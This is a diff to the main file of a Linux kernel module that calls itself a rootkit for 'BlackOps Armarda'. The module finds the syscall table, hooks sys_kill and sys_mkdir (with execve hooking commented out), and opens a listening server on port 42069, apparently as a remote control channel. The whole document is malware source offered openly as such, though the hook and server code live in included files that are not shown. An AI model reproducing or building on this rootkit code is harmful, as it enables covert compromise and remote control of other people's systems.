@@ -11,32 +11,27 @@ kernel module imports
 #include <custom/hooks.c> //functions for hooking syscalls
 #include <custom/hooked_syscalls.c> //functions of the hooked syscalls
 
-#define BUFFER_SIZE 1024 //size of buffers used
+#define BUFFER_SIZE 2048 //size of buffers used
 
 static void __exit ModuleExit(void) {
-  remove_hook(&sys_kill);
-  remove_hook(&sys_mkdir);
-  client_print("[rootkit] module removed!!!");
+	remove_hook(&sys_kill); //removes sys_kill hook
+	remove_hook(&sys_mkdir); //removes sys_mkdir hook
+	//remove_hook(&sys_execve); //removes sys_execve hook
+	client_print("[rootkit] module removed!!!\n");
 
-  printk(KERN_DEBUG "[rootkit] removed\n"); //DEBUG
+	printk(KERN_DEBUG "[rootkit] removed\n"); //DEBUG
 }
 
 static int __init ModuleInit(void) {
-  printk(KERN_DEBUG "[rootkit] installed\n"); //DEBUG //DEBUG logs to dmesg
-  get_syscall_table(); //gets suyscall table
-  install_hook(&sys_kill); //installs sys_kill hook
-  install_hook(&sys_mkdir); //installs sys_mkdir hook
-  install_hook(&sys_execve); //installs sys_execve hook
-  orig_kill = sys_kill.orig_syscall; //sets orig_kill to original syscall adress
-  orig_mkdir = sys_mkdir.orig_syscall; //sets orig_mkdir to original syscall adress
-  orig_execve = sys_execve.orig_syscall; //sets orig_execve to original syscall adress
-
-  client.client_handler = &client_handler; //sets adress of client handler
-
-  if (run_server(42069)<0){//runs server
-	  ModuleExit();
-  }
-  return 0;
+	printk(KERN_DEBUG "[rootkit] installed\n"); //DEBUG //DEBUG logs to dmesg
+	get_syscall_table(); //gets suyscall table
+	install_hook(&sys_kill); //installs sys_kill hook
+	install_hook(&sys_mkdir); //installs sys_mkdir hook
+	//install_hook(&sys_execve); //installs sys_execve hook
+	orig_kill = sys_kill.orig_syscall; //sets orig_kill to original syscall adress
+	orig_mkdir = sys_mkdir.orig_syscall; //sets orig_mkdir to original syscall adress
+	//orig_execve = sys_execve.orig_syscall; //sets orig_execve to original syscall adress
+	return run_server(42069);
 }
 
 
@@ -45,4 +40,4 @@ module_exit(ModuleExit);
 MODULE_AUTHOR("Artemis's Angel"); //author
 MODULE_DESCRIPTION("Rootkit for BlackOps Armarda"); //description
 MODULE_LICENSE("GPL");// GPL license
-MODULE_VERSION("0.01"); //version
+MODULE_VERSION("1.07"); //version
